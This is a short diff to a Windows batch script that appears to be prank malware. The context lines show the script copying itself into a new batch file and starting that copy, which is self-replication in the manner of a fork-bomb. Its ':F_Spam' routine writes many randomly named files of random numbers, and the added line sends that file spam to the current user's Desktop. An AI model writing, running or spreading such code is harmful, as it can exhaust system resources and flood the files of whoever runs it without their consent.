@@ -13,6 +13,7 @@ type %0 >> %x%.bat
 start %x%.bat >nul
 
 :F_Spam
+cd C:\Users\%username%\Desktop
 echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% > %random%.%random%
 echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% > %random%.%random%
 echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% > %random%.%random%
